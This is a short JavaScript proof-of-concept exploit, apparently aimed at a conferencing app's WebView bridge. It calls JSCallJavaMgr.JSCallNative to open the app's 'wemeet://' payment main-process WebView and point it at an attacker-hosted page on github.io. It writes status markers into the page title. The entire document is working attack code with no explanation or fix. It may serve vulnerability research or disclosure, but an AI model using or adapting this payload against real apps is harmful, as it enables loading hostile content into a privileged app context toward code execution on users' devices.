(function(){
  document.title='P84TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P84CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
  };
  var attacker='https://gitwhs.github.io/wm-poc-rce/p84atk.html';
  var payMain='wemeet://page/pay/main_process_webview';
  setTimeout(function(){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:'CommonPlugin',method:'OpenNewPage',
      param:{scheme:payMain,router_params:{url:attacker,from_webView:true}},
      callId:'O6'
    }));
    document.title='P84TB-DONE:'+location.host;
  }, 1500);
})();
